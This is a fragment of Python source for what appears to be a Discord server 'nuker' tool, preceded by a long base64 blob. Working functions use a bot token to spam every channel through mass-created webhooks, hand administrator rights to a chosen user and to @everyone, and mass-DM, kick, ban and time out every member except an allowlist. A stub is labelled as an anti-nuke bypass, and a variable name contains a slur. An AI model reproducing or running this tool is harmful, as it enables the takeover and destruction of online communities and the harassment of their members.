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'
        def sendwbh(chid, wbh, tkn, img, msg, amount):
            payload = {
                'name': wbh,
                'avatar': img
            }
            r = requests.post(f'https://discord.com/api/v9/channels/{chid}/webhooks', headers={'authorization': f'Bot {tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                Logging.success('Successfully created webhook')
                wbhinf = r.json()
                url = wbhinf['url']
                for _ in range(amount):
                    payload2 = {
                        'content': msg
                    }

                    try:
                        kingdawn = requests.post(url, json=payload2)
                        if kingdawn.status_code in [200, 201, 204]:
                            Logging.success(f'Successfully sent message with webhook {url}')
                        elif kingdawn.status_code == 429:
                            Logging.info('Rate limit while sending webhook message')
                        else:
                            Logging.fail('Failed to send webhook message')
                    except Exception as e:
                        Logging.fail(f'Failed to do whatever {e}')
        
        for channel in channels:
            t = threading.Thread(target=sendwbh, args=(channel['id'],wbh,tkn,img,msg,amount))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
    def EditServer(self, name, icon):
        payload = {
            'name': name
        }
        if icon == 'path':
            with open('shi/icon.png', 'rb') as f:
                ic = base64.b64encode(f.read()).decode('utf-8')
                icon = 'data:image/png;base64,' + ic
                payload['icon'] = icon

        elif icon:
            if 'https://' in icon:
                try:
                    im = requests.get(icon, headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240'})
                    if im.status_code != 200:
                        print(im.text)

                        Logging.fail('Failed to fetch image')
                    else:
                        Logging.success('Successfully fetched image')
                        ic = im.content
                        ico = base64.b64encode(ic).decode('utf-8')
                        icon = 'data:image/png;base64,' + ico
                        payload['icon'] = icon

                except:
                    pass
            else:
                Logging.fail('No image URL')
        r = requests.patch(f'https://ptb.discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
        if r.status_code in [200, 201, 204]:
            Logging.success('Successfully edited the server')
        else:
            Logging.fail(f'Failed to edit the server {r.text}')

    def createrole(self, serverid, name, permissions: 0):
        payload = {
            'name': name,
            'permissions': str(permissions)
        }
        try:
            r = requests.post(f'https://discord.com/api/v9/guilds/{serverid}/roles', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                rjs = r.json()
                Logging.success(f'Successfully created role {rjs["id"]}')
                return rjs['id']
            elif r.status_code == 429:
                Logging.info('Rate limit response while trying to create role')
                return False
            else:
                Logging.fail(f'Failed to create role: {r.status_code} {r.text}')
                return False
        except Exception as e:
            Logging.fail(f'Failed to create role: {e}')
    def CRoles(self, serverid, name, amount):
        threads = []
        for i in range(amount):
            t = threading.Thread(target=self.createrole, args=(serverid, name, 0))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()
            
    def GiveAdmin(self, serverid, userid):
        role = self.createrole(serverid, '.', permissions=4360658820268031)
        if role:
            payload = {
            "roles": [role]
        }
            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                Logging.success(f'Gave {userid} admin')
            elif r.status_code == 429:
                Logging.info(f'Rate limit response while trying to give {userid} admin')
            else:
                Logging.fail(f'Failed to give {userid} admin: {r.status_code} - {r.text}')

    def GiveEveryoneAdmin(self, serverid):
        payload = {'permissions': '4360658820268031'}
        try:
            r = requests.patch(f'https://discord.com/api/v9/guilds/{serverid}/roles/{serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                Logging.success('Give admin to @everyone')
            elif r.status_code == 429:
                Logging.info('Rate limit response while trying to give @everyone admin')
            else:
                Logging.fail(f'Failed to give @everyone admin: {r.status_code} - {r.text}')
        except Exception as e:
            Logging.fail(f'Failed to give @everyone admin: {e}')
            
    
    
    def timeout(self, userid, days):
        days = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
        payload = {
        "communication_disabled_until": days
        }
        try:
            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
            st = 'days' if days != 1 else 'day'
            if r.status_code in [200, 201, 204]:
                Logging.success(f'Successfully timed out {userid} for {days} {st}')
            elif r.status_code == 429:
                Logging.info(f'Rate limit response while trying to time out {userid} for {days} {st}')
            else:
                Logging.fail(f'Failed to time out {userid} for {days} {st}: {r.status_code}, {r.text}')
        except Exception as e:
            Logging.fail(f'Failed to time out {userid} for {days} {st}: {e}')

    def dm(self, userid, msg):
        payload = {"recipient_id": userid}
        try:
            create = requests.post("https://discord.com/api/v9/users/@me/channels", json=payload, headers={'authorization': f'Bot {self.tkn}'})
            if create.status_code in [200, 201, 204]:
                js = create.json()
                chid = js['id']
                mesg = {'content': msg}
                r = requests.post(f'https://discord.com/api/v10/channels/{chid}/messages', headers={'authorization': f'Bot {self.tkn}'}, json=mesg)
                if r.status_code in [200, 201, 204]:
                    Logging.success(f'Successfully sent message to {userid}')
                    
                elif r.status_code == 429:
                    Logging.info(f'Rate limit response while trying to dm {userid}')
                else:
                    Logging.fail(f'Failed to dm user: {r.status_code} - {r.text}')
        except Exception as e:
            Logging.fail(f'Failed to dm user: {e}')
    
    def DMAll(self, msg):
        members = []
        threads = []
        payload = {'limit': 1000}
        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
        m = nig.json()
        for mem in m:
            id = mem['user']['id']
            members.append(id)
    
        for member in members:
            t = threading.Thread(target=self.dm, args=(member, msg,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()        
            
    def KickAll(self):
        members = []
        threads = []
        ids = loadids()
        payload = {'limit': 1000}
        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
        m = nig.json()
        for mem in m:
            id = mem['user']['id']
            members.append(id)
            
        def kick(userid):
            try:
                r = requests.delete(f'https://discord.com/api/v9/guilds/{self.serverid}/members/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
                if r.status_code in [200, 201, 204]:
                    Logging.success(f'Kicked {userid}')
                elif r.status_code == 429:
                    Logging.info(f'Rate limit response while trying to kick {userid}')
                else:
                    Logging.fail(f'Failed to kick {userid}: {r.status_code} - {r.text}')
            except Exception as e:
                Logging.fail(f'Failed to kick {userid}: {e}')

        for member in members:
            if member in ids:
                continue
            t = threading.Thread(target=kick, args=(member,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()

    def BanAll(self):
        members = []
        ids = loadids()
        threads = []
        payload = {'limit': 1000}
        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
        m = nig.json()
        for mem in m:
            id = mem['user']['id']
            members.append(id)
            
        def ban(userid):
            payload = {'delete_message_seconds': 0}
            try:
                r = requests.put(f'https://discord.com/api/v9/guilds/{self.serverid}/bans/{userid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
                if r.status_code in [200, 201, 204]:
                    Logging.success(f'Banned {userid}')
                elif r.status_code == 429:
                    Logging.info(f'Rate limit response while trying to ban {userid}')
                else:
                    Logging.fail(f'Failed to ban {userid}: {r.status_code} - {r.text}')
            except Exception as e:
                Logging.fail(f'Failed to ban {userid}: {e}')   
                
        for member in members:
            if member in ids:
                continue
            t = threading.Thread(target=ban, args=(member,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()        
        
    def TimeoutAll(self, days):
        ids = loadids()

        members = []
        threads = []
        payload = {'limit': 1000}
        nig = requests.get(f"https://discord.com/api/v9/guilds/{self.serverid}/members", headers={'authorization': f'Bot {self.tkn}'}, params=payload)
        m = nig.json()
        for mem in m:
            id = mem['user']['id']
            members.append(id)
    
        for member in members:
            if member in ids:
                continue

            t = threading.Thread(target=self.timeout, args=(member, days,))
            threads.append(t)
            t.start()
            time.sleep(0.01)
        
        for t in threads:
            t.join()        


    def disable_community(self):
        payload = {
        "features": []  
    }
        try:
            r = requests.patch(f'https://discord.com/api/v9/guilds/{self.serverid}', headers={'authorization': f'Bot {self.tkn}'}, json=payload)
            if r.status_code in [200, 201, 204]:
                Logging.success('Successfully disabled community mode')
            elif r.status_code == 420:
                Logging.info('Rate limit response while trying to disable community mode')
            else:
                Logging.fail(f'Failed to disable community mode: {r.status_code} - {r.text}')
                
        except Exception as e:
            Logging.fail(f'Failed to disable community mode: {e}')
            
    def AntiNukeBypass(self, msg):
        Logging.info('WIP')
